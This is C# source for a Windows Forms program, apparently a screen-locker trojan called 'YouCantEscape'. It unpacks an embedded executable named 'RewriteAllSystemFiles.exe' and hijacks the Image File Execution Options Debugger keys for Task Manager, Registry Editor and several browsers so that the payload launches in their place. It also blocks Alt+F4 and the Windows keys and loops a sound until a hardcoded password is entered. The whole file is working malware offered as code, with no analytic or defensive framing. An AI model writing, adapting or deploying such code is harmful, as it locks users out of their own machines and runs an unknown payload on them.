using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32; 
using System.Runtime.InteropServices;
using System.Net; 
using System.IO; 
using System.Diagnostics;
using System.Reflection;
using System.Media;
namespace YouCantEscape
{
    public partial class YouCantEscape : Form
    {
        private SoundPlayer YoucantEscape;
        private bool DISABLE_ALT_F4 = false;
        private bool DISABLE_RWin = false;
        private bool DISABLE_LWin = false;
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Это Распаковщик Файлов из Папки Ресурсов... НЕ ИЗМЕНЯТЬ ЭТОТ КОД!!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public YouCantEscape()
        {
            //Троян Ты не Освободишся 
            InitializeComponent();
            this.KeyPreview = true; 
            Directory.CreateDirectory(@"C:\Temp\YouCantEscape");
            Extract("YouCantEscape", @"C:\Temp\YouCantEscape", "Resources", "YouCantEscape.wav");
            Extract("YouCantEscape", @"C:\Temp\YouCantEscape", "Resources", "RewriteAllSystemFiles.exe");
            MessageBox.Show("You Can't Escape");
                YoucantEscape = new SoundPlayer (@"C:\Temp\YouCantEscape\YouCantEscape.wav");
            YoucantEscape.PlayLooping();

        }
private void textBox1_TextChanged(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("Sorry but You Can't Escape", "You Can't Escape", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (textBox1.Text == "ObMi2193GHNTR19FV")
            {
                MessageBox.Show("OKAY, This is Correct Password");
                RegistryKey RewriteTaskMGR = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe");
                RegistryKey RewriteChrome = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
                RegistryKey RewriteInternetExplorer = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
                RegistryKey RewriteRegEDIT = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
                RegistryKey RewriteMSEDGE = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe");
                RewriteTaskMGR.DeleteValue("Debugger");
                RewriteChrome.DeleteValue("Debugger");
                RewriteInternetExplorer.DeleteValue("Debugger");
                RewriteRegEDIT.DeleteValue("Debugger");
                RewriteMSEDGE.DeleteValue("Debugger");
                MessageBox.Show("Your Files is Restored");
                this.Close(); 
            }
        }

        private void YouCantEscape_Load(object sender, EventArgs e)
        {
            RegistryKey RewriteTaskMGR = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe");
            RegistryKey RewriteChrome = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe");
            RegistryKey RewriteInternetExplorer = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
            RegistryKey RewriteRegEDIT = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
            RegistryKey RewriteMSEDGE = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe");
            RewriteTaskMGR.SetValue("Debugger", @"C:\Temp\YouCantEscape\RewriteAllSystemFiles.exe");
            RewriteChrome.SetValue("Debugger", @"C:\Temp\YouCantEscape\RewriteAllSystemFiles.exe");
            RewriteInternetExplorer.SetValue("Debugger", @"C:\Temp\YouCantEscape\RewriteAllSystemFiles.exe");
            RewriteRegEDIT.SetValue("Debugger", @"C:\Temp\\YouCantEscape\RewriteAllSystemFiles.exe");
            RewriteMSEDGE.SetValue("Debugger", @"C:\Temp\YouCantEscape\RewriteAllSystemFiles.exe");
        }

        private void YouCantEscape_KeyDown(object sender, KeyEventArgs e)
        {
            DISABLE_ALT_F4 = (e.KeyCode.Equals(Keys.F4) && e.Alt == true);
            DISABLE_RWin = (e.KeyCode.Equals(Keys.RWin) == true);
            if (DISABLE_RWin)
            {
                e.Handled = true;
                this.MaximizeBox = true;
                MessageBox.Show("Nah Man...", "You Can't Close Me", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                return; 
            }
            DISABLE_LWin = (e.KeyCode.Equals(Keys.LWin) == true);
            if(DISABLE_LWin)
            {
                e.Handled = true;
                this.MaximizeBox = true;
                MessageBox.Show("Nah Man...", "You Can't Close Me", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                return;
            }
        }

        private void YouCantEscape_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (DISABLE_ALT_F4)
            {
                e.Cancel = true;
                MessageBox.Show("You Can't Close Me, My Friend");
                return; 
            }
            if (DISABLE_RWin)
            {
                e.Cancel = true;
                this.MaximizeBox = true;
                return;
            }
            if (DISABLE_LWin)
            {
                e.Cancel = true;
                this.MaximizeBox = true;
                return;
            }
            if (e.CloseReason == CloseReason.UserClosing | 
                e.CloseReason == CloseReason.MdiFormClosing | 
                e.CloseReason == CloseReason.TaskManagerClosing |
                e.CloseReason == CloseReason.FormOwnerClosing)  
            {
                e.Cancel = true;
            }
        }
    }
}
